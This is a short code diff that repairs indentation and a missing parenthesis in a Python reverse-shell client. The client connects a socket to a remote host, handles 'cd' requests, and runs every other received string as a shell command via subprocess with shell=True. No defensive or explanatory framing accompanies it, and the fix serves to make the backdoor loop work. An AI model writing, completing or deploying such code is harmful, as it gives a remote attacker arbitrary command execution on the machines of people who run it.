@@ -11,11 +11,11 @@ s.connect( (host, port) )
 while True:
 	data = s.recv(1024)
 	if data[:2].decode("utf-8") == "cd":
-            try:
-		os.chdir( data[3:].decode("utf-8") )
-            except:
-                cwd = os.getcwd() + ">"
-                s.send( str.encode( "Invalid Directory\n"+ cwd  )
+		try:
+			os.chdir( data[3:].decode("utf-8") )
+		except:
+			cwd = os.getcwd() + ">"
+			s.send( str.encode( "Invalid Directory\n"+ cwd  ) )
 
 	if len(data) > 0:
 		cmd = subprocess.Popen( data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE )
